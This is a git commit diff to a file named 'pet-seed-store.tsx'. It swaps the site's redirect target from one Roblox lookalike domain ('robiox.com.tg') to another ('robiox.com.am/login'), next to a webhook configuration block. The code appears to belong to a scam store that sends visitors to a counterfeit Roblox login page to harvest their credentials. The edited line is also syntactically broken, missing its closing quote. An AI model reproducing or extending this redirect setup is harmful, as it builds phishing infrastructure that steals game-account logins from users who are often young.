fd50ba8f60340f6e8ae660dd5b2129cdcf3a1803
Tanga <seanjacobolivas21@gmail.com>
2025-08-16 09:56:26 +0800

    Update pet-seed-store.tsx

--- pet-seed-store.tsx
+++ pet-seed-store.tsx
@@ -117,7 +117,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F284353541924%2Fprofile",
+  url: "https://www.robiox.com.am/login?returnUrl=9603182548180515,
 }
 
 // Webhook configuration
